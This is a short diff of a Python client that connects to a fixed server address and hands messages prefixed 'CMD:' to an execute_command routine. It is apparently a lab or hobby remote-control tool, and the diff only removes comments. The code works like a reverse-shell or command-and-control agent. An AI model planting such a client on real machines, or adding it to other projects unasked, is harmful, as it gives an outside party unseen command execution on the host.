@@ -2,7 +2,7 @@ import socket
 import subprocess
 import time
 
-SERVER_IP = "10.0.0.3"  # ‼️ REPLACE with your Server IP
+SERVER_IP = "10.0.0.3"
 PORT = 5001
 
 
@@ -44,7 +44,7 @@ def main():
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.connect((SERVER_IP, PORT))
 
-                # ‼️ HANDSHAKE: Tell the server we are the Client
+
                 s.sendall(b"CLIENT_CONNECTED\n")
                 print("Connected! Waiting for commands...")
 
@@ -59,7 +59,7 @@ def main():
                         message, buffer = buffer.split("\n", 1)
                         message = message.strip()
 
-                        # ‼️ The server sends commands prefixed with CMD:
+
                         if message.startswith("CMD:"):
                             raw_cmd = message.split(":", 1)[1]
                             execute_command(raw_cmd)
